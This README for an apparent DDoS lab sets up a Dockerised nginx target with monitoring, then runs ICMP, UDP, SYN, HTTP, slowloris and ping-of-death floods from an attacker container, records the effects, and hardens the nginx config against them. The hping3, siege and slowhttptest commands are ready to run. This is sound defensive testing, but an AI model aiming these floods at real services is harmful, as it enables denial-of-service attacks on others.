# prjctr-16-ddos

Create a token in influxdb for telegraf, add to telegraf config

Create a token in influxdb for grafana, add to grafana config

```
http://127.0.0.1:3000/connections/datasources/edit

docker exec -it influxdb influx auth create --org telegraf --read-buckets --read-checks  --read-checks  --read-dashboards --skip-verify --read-telegrafs --read-notificationEndpoints
```

### Run the cluster

```
docker compose up -d --build
```

### ICMP flood

No noticeable effects

```
docker exec -it attacker hping3 --flood --icmp nginx -p 8080
```

### UDP flood

No noticeable effects

```
docker exec -it attacker hping3 --flood --rand-source --udp -p 8080 nginx
```

### HTTP flood

**Noticeably increases CPU and Memory usage of nginx**

```
docker exec -it attacker siege -b -c250 -t60s http://nginx:8080
```

### Slowloris

**Significantly increases memory usage**

```
docker exec -it attacker slowhttptest -c 1050 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://nginx:8080 -x 24 -p 3
```

### SYN flood

No noticeable effects

```
docker exec -it attacker hping3 -S --flood -V -p 8080 nginx
```

### Ping of death

No noticeable effects

```
docker exec -it attacker fping -b 65488 -c 10000 -p 10 nginx
```

### Re-deploy nginx with the secured config

```
NGINX_CONF_FILE=./nginx/nginx-secure.conf docker compose up -d
```

Now slowloris and HTTP flood attacks have no effect
